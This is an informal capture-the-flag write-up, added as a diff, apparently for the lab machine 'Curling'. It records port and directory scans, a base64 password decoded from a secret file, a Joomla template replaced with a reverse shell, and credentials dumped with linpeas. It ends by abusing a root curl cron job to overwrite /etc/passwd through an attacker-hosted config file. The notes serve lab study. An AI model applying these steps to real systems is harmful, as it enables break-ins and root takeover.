@@ -1,0 +1,101 @@
+---NMAP---
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA)
+|   256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA)
+|_  256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-generator: Joomla! - Open Source Content Management
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Home
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+---MASSCAN---
+Initiating SYN Stealth Scan
+Scanning 1 hosts [65535 ports/host]
+Discovered open port 80/tcp on 10.10.10.150
+Discovered open port 22/tcp on 10.10.10.150
+
+---GOBUSTER---
+/ (lowercase-medium.txt):
+  /index.php (Status: 200)
+  /images (Status: 200)
+  /templates (Status: 200)
+  /media (Status: 200)
+  /modules (Status: 200)
+  /bin (Status: 200)
+  /plugins (Status: 200)
+  /includes (Status: 200)
+  /language (Status: 200)
+  /components (Status: 200)
+  /cache (Status: 200)
+  /libraries (Status: 200)
+  /tmp (Status: 200)
+  /layouts (Status: 200)
+  /secret.txt (Status: 200)
+  /administrator (Status: 200)
+  /configuration.php (Status: 200)
+  /htaccess.txt (Status: 200)
+  /cli (Status: 200)
+
+
+---ATTEMPTS---
+in / found:
+  - Floris
+(Cewl Curling site!) cewl is a linux program that generate password through website content -- unsuccessful
+(Written by Super User)
+
+found in /secret.txt: Q3VybGluZzIwMTgh
+*echo Q3VybGluZzIwMTgh | base64 -d
+Curling2018!
+searching the web found that http://10.10.10.150/administrator/components/ exists
+trying to login ssh (unsuccessful)
+
+modifing the template index.php to a reverse shell one
+done!
+
+---PRIVESC---
+*./linpeas.sh
+  [+] Searching passwords in config PHP files
+        public $password = 'mYsQ!P4ssw0rd$yea!';
+  [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#services
+        /var/www/html/libraries/src/Http/Transport/cacert.pem  
+
+nothing could be achieved on *mysql -u floris -p mYsQ!P4ssw0rd$yea!
+
+found file in /home/floris/password_backup which is a hex dump
+using the xdd program to recover the file in it is a bzip2 format
+*bzip FILE -d
+returns a gzip file
+doing the decompress stepts until reach a tar file which returns a password.txt
+*cat password.txt:
+  5d<wdCbdZu)|hChXll
+*su floris
+done!
+cat /home/floris/user.txt
+using pspy64 to see if /home/floris/admin-area/input is used by some process
+*pspy64 | grep input
+2020/09/08 14:08:01 CMD: UID=0    PID=2209   | /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
+curl command use it
+check what is -K
+*curl --help
+  -K, --config <file> Read config from a file
+exploiting the cron:
+copy the passwd file and change the root password
+generating a new root pass
+*openssl passwd -1 -salt root james
+changing the root:THIS:... to the password
+
+open a httpserver
+*python -m SimpleHTTPServer 80
+change the input file to the host ip and add the output option to /etc/passwd and wait for the curl command to be executed
+-
+a problem just discovered:
+  2020/09/08 14:22:01 CMD: UID=0    PID=2517   | /bin/sh -c sleep 1; cat /root/default.txt > /home/floris/admin-area/input 
+the input file is changed everytime.
+problem overcomed, found that it is a race condition so if the curl is executed before the input change everything works fine
+-
+
+kudos!
+*cat /root/root.txt
